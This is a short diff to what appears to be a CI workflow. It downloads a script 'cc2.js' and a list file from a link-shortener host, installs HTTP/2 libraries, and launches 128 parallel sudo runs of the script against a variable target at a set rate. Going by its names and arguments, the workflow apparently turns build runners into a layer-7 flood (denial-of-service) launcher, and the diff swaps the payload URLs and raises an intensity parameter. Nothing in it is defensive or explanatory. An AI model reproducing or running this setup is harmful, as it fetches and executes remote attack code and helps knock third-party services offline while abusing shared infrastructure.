@@ -26,8 +26,8 @@ jobs:
     steps:
     - name: Dosyaları indir ve hazırla
       run: |
-        wget https://curl.by/dIz_-/cc2.js
-        wget https://curl.by/43iAc/good.txt
+        wget https://curl.by/_vXyB/cc2.js
+        wget https://curl.by/31Bay/good.txt
         chmod +x cc2.js
         npm i hpack https commander colors 
     - name: run
@@ -38,7 +38,7 @@ jobs:
         
         PIDS=()
         for i in {1..128}; do
-          sudo timeout $TIME node cc2.js GET "$TARGET" 95 16 "$RATE" good.txt --full  --query 3
+          sudo timeout $TIME node cc2.js GET "$TARGET" 185 16 "$RATE" good.txt --full  --query 3
           PIDS+=($!)
         done
         
